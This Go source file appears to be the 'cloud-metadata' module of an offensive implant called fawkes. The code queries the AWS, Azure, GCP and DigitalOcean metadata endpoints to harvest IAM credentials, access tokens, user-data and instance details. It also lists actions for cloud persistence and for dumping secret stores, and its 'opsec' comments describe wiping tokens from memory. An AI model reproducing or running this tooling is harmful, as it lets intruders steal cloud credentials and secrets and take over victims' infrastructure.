package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

type CloudMetadataCommand struct{}

func (c *CloudMetadataCommand) Name() string { return "cloud-metadata" }
func (c *CloudMetadataCommand) Description() string {
	return "Probe cloud instance metadata services (AWS/Azure/GCP/DigitalOcean) for credentials and instance info"
}

type cloudMetadataArgs struct {
	Action   string `json:"action"`   // detect, all, creds, identity, userdata, network
	Provider string `json:"provider"` // auto, aws, azure, gcp, digitalocean
	Timeout  int    `json:"timeout"`  // per-request timeout in seconds (default: 3)
}

const (
	// Metadata service endpoints
	awsMetadataBase = "http://169.254.169.254"
	awsTokenURL     = awsMetadataBase + "/latest/api/token"
	awsMetaURL      = awsMetadataBase + "/latest/meta-data/"
	awsCredsURL     = awsMetadataBase + "/latest/meta-data/iam/security-credentials/"
	awsIdentityURL  = awsMetadataBase + "/latest/dynamic/instance-identity/document"
	awsUserdataURL  = awsMetadataBase + "/latest/user-data"

	azureMetadataBase = "http://169.254.169.254"
	azureInstanceURL  = azureMetadataBase + "/metadata/instance?api-version=2021-02-01"
	azureTokenURL     = azureMetadataBase + "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

	gcpMetadataBase   = "http://metadata.google.internal"
	gcpProjectURL     = gcpMetadataBase + "/computeMetadata/v1/project/"
	gcpInstanceURL    = gcpMetadataBase + "/computeMetadata/v1/instance/"
	gcpTokenURL       = gcpMetadataBase + "/computeMetadata/v1/instance/service-accounts/default/token"
	gcpServiceAcctURL = gcpMetadataBase + "/computeMetadata/v1/instance/service-accounts/"

	doMetadataBase = "http://169.254.169.254"
	doMetadataURL  = doMetadataBase + "/metadata/v1.json"

	defaultCloudTimeout = 3
	metadataMaxSize     = 64 * 1024 // 64KB per response
)

func (c *CloudMetadataCommand) Execute(task structs.Task) structs.CommandResult {
	args := cloudMetadataArgs{Action: "detect", Provider: "auto", Timeout: defaultCloudTimeout}
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return errorf("Error parsing parameters: %v", err)
		}
	}
	if args.Action == "" {
		args.Action = "detect"
	}
	if args.Provider == "" {
		args.Provider = "auto"
	}
	if args.Timeout <= 0 {
		args.Timeout = defaultCloudTimeout
	}

	timeout := time.Duration(args.Timeout) * time.Second

	switch args.Action {
	case "detect":
		return cloudDetect(timeout)
	case "all":
		return cloudAll(args.Provider, timeout)
	case "creds", "iam":
		return cloudCreds(args.Provider, timeout)
	case "identity":
		return cloudIdentity(args.Provider, timeout)
	case "userdata":
		return cloudUserdata(args.Provider, timeout)
	case "network":
		return cloudNetwork(args.Provider, timeout)
	case "aws-iam":
		return successResult(awsEnumIAM(timeout))
	case "azure-graph":
		return successResult(azureEnumGraph(timeout))
	case "gcp-iam":
		return successResult(gcpEnumIAM(timeout))
	case "aws-persist":
		return successResult(awsPersist(timeout))
	case "azure-persist":
		return successResult(azurePersist(timeout))
	case "aws-ssm":
		return successResult(awsGetSSMSecrets(timeout))
	case "azure-keyvault", "azure-vault":
		return successResult(azureGetKeyVaultSecrets(timeout))
	case "gcp-secrets", "gcp-secretmanager":
		return successResult(gcpGetSecretManager(timeout))
	default:
		return errorResult("Error: unknown action. Available: detect, all, creds, identity, userdata, network, aws-iam, azure-graph, gcp-iam, aws-persist, azure-persist, aws-ssm, azure-keyvault, gcp-secrets")
	}
}

// cloudDetect probes all providers and reports which one responds
func cloudDetect(timeout time.Duration) structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("=== Cloud Instance Detection ===\n\n")

	detected := false

	// AWS: try IMDSv2 first, then v1
	if token := awsGetIMDSv2Token(timeout); token != "" {
		sb.WriteString("[+] AWS EC2 detected (IMDSv2)\n")
		if id := metadataGet(awsMetaURL+"instance-id", timeout, map[string]string{"X-aws-ec2-metadata-token": token}); id != "" {
			sb.WriteString(fmt.Sprintf("    Instance ID: %s\n", id))
		}
		if region := metadataGet(awsMetaURL+"placement/region", timeout, map[string]string{"X-aws-ec2-metadata-token": token}); region != "" {
			sb.WriteString(fmt.Sprintf("    Region: %s\n", region))
		}
		structs.ZeroString(&token) // opsec: clear IMDSv2 session token
		detected = true
	} else if id := metadataGet(awsMetaURL+"instance-id", timeout, nil); id != "" {
		sb.WriteString("[+] AWS EC2 detected (IMDSv1 — no token required)\n")
		sb.WriteString(fmt.Sprintf("    Instance ID: %s\n", id))
		if region := metadataGet(awsMetaURL+"placement/region", timeout, nil); region != "" {
			sb.WriteString(fmt.Sprintf("    Region: %s\n", region))
		}
		detected = true
	}

	// Azure
	if resp := metadataGet(azureInstanceURL, timeout, map[string]string{"Metadata": "true"}); resp != "" {
		sb.WriteString("[+] Azure VM detected\n")
		var inst map[string]interface{}
		if err := json.Unmarshal([]byte(resp), &inst); err == nil {
			if compute, ok := inst["compute"].(map[string]interface{}); ok {
				if name, ok := compute["name"].(string); ok {
					sb.WriteString(fmt.Sprintf("    VM Name: %s\n", name))
				}
				if loc, ok := compute["location"].(string); ok {
					sb.WriteString(fmt.Sprintf("    Location: %s\n", loc))
				}
			}
		}
		detected = true
	}

	// GCP
	if projID := metadataGet(gcpProjectURL+"project-id", timeout, map[string]string{"Metadata-Flavor": "Google"}); projID != "" {
		sb.WriteString("[+] GCP instance detected\n")
		sb.WriteString(fmt.Sprintf("    Project ID: %s\n", projID))
		if zone := metadataGet(gcpInstanceURL+"zone", timeout, map[string]string{"Metadata-Flavor": "Google"}); zone != "" {
			sb.WriteString(fmt.Sprintf("    Zone: %s\n", zone))
		}
		detected = true
	}

	// DigitalOcean
	if resp := metadataGet(doMetadataURL, timeout, nil); resp != "" {
		sb.WriteString("[+] DigitalOcean droplet detected\n")
		var doMeta map[string]interface{}
		if err := json.Unmarshal([]byte(resp), &doMeta); err == nil {
			if id, ok := doMeta["droplet_id"]; ok {
				sb.WriteString(fmt.Sprintf("    Droplet ID: %v\n", id))
			}
			if region, ok := doMeta["region"].(string); ok {
				sb.WriteString(fmt.Sprintf("    Region: %s\n", region))
			}
		}
		detected = true
	}

	if !detected {
		sb.WriteString("[-] No cloud metadata service detected\n")
		sb.WriteString("    Tested: AWS IMDS, Azure IMDS, GCP metadata, DigitalOcean metadata\n")
	}

	return successResult(sb.String())
}

// cloudAll dumps all available metadata from the detected/specified provider
func cloudAll(provider string, timeout time.Duration) structs.CommandResult {
	var sb strings.Builder

	providers := resolveProviders(provider, timeout)
	if len(providers) == 0 {
		return successResult("[-] No cloud metadata service detected or specified provider not available")
	}

	for _, p := range providers {
		switch p {
		case "aws":
			sb.WriteString(awsDumpAll(timeout))
		case "azure":
			sb.WriteString(azureDumpAll(timeout))
		case "gcp":
			sb.WriteString(gcpDumpAll(timeout))
		case "digitalocean":
			sb.WriteString(doDumpAll(timeout))
		}
		sb.WriteString("\n")
	}

	return successResult(sb.String())
}

// cloudCreds extracts IAM credentials from the detected provider
func cloudCreds(provider string, timeout time.Duration) structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("=== Cloud IAM Credentials ===\n\n")

	providers := resolveProviders(provider, timeout)
	if len(providers) == 0 {
		return successResult("[-] No cloud metadata service detected or specified provider not available")
	}

	for _, p := range providers {
		switch p {
		case "aws":
			sb.WriteString(awsGetCreds(timeout))
		case "azure":
			sb.WriteString(azureGetToken(timeout))
		case "gcp":
			sb.WriteString(gcpGetToken(timeout))
		case "digitalocean":
			sb.WriteString("[-] DigitalOcean: No IAM credential endpoint\n")
		}
	}

	return successResult(sb.String())
}

// cloudIdentity extracts instance identity information
func cloudIdentity(provider string, timeout time.Duration) structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("=== Cloud Instance Identity ===\n\n")

	providers := resolveProviders(provider, timeout)
	if len(providers) == 0 {
		return successResult("[-] No cloud metadata service detected")
	}

	for _, p := range providers {
		switch p {
		case "aws":
			sb.WriteString(awsGetIdentity(timeout))
		case "azure":
			sb.WriteString(azureGetIdentity(timeout))
		case "gcp":
			sb.WriteString(gcpGetIdentity(timeout))
		case "digitalocean":
			sb.WriteString(doGetIdentity(timeout))
		}
	}

	return successResult(sb.String())
}

// cloudUserdata extracts instance user-data (may contain secrets)
func cloudUserdata(provider string, timeout time.Duration) structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("=== Cloud User Data ===\n\n")

	providers := resolveProviders(provider, timeout)
	if len(providers) == 0 {
		return successResult("[-] No cloud metadata service detected")
	}

	for _, p := range providers {
		switch p {
		case "aws":
			sb.WriteString(awsGetUserdata(timeout))
		case "azure":
			sb.WriteString(azureGetUserdata(timeout))
		case "gcp":
			sb.WriteString(gcpGetUserdata(timeout))
		case "digitalocean":
			sb.WriteString(doGetUserdata(timeout))
		}
	}

	return successResult(sb.String())
}

// cloudNetwork extracts network configuration
func cloudNetwork(provider string, timeout time.Duration) structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("=== Cloud Network Configuration ===\n\n")

	providers := resolveProviders(provider, timeout)
	if len(providers) == 0 {
		return successResult("[-] No cloud metadata service detected")
	}

	for _, p := range providers {
		switch p {
		case "aws":
			sb.WriteString(awsGetNetwork(timeout))
		case "azure":
			sb.WriteString(azureGetNetwork(timeout))
		case "gcp":
			sb.WriteString(gcpGetNetwork(timeout))
		case "digitalocean":
			sb.WriteString(doGetNetwork(timeout))
		}
	}

	return successResult(sb.String())
}

// --- Helper functions ---

// metadataGet makes a GET request to a metadata endpoint with optional headers
func metadataGet(url string, timeout time.Duration, headers map[string]string) string {
	return metadataRequest("GET", url, timeout, headers, metadataMaxSize)
}

// metadataPut makes a PUT request (used for AWS IMDSv2 token)
func metadataPut(url string, timeout time.Duration, headers map[string]string) string {
	return metadataRequest("PUT", url, timeout, headers, 1024)
}

// metadataRequest makes an HTTP request to a metadata endpoint and returns the response body
func metadataRequest(method, url string, timeout time.Duration, headers map[string]string, maxBody int64) string {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, method, url, nil)
	if err != nil {
		return ""
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	client := &http.Client{Timeout: timeout}
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return ""
	}

	body, err := io.ReadAll(io.LimitReader(resp.Body, maxBody))
	if err != nil {
		return ""
	}
	result := strings.TrimSpace(string(body))
	structs.ZeroBytes(body) // opsec: clear cloud metadata response (may contain IAM tokens)
	return result
}

// resolveProviders determines which cloud providers to query
func resolveProviders(provider string, timeout time.Duration) []string {
	if provider != "auto" && provider != "" {
		p := strings.ToLower(provider)
		switch p {
		case "aws", "azure", "gcp", "digitalocean":
			return []string{p}
		default:
			return nil
		}
	}

	// Auto-detect: probe all providers
	var found []string
	if awsGetIMDSv2Token(timeout) != "" || metadataGet(awsMetaURL+"instance-id", timeout, nil) != "" {
		found = append(found, "aws")
	}
	if metadataGet(azureInstanceURL, timeout, map[string]string{"Metadata": "true"}) != "" {
		found = append(found, "azure")
	}
	if metadataGet(gcpProjectURL+"project-id", timeout, map[string]string{"Metadata-Flavor": "Google"}) != "" {
		found = append(found, "gcp")
	}
	if metadataGet(doMetadataURL, timeout, nil) != "" {
		found = append(found, "digitalocean")
	}
	return found
}

// Provider-specific functions are in:
// - cloudmetadata_aws.go
// - cloudmetadata_azure.go
// - cloudmetadata_gcp.go
// - cloudmetadata_do.go
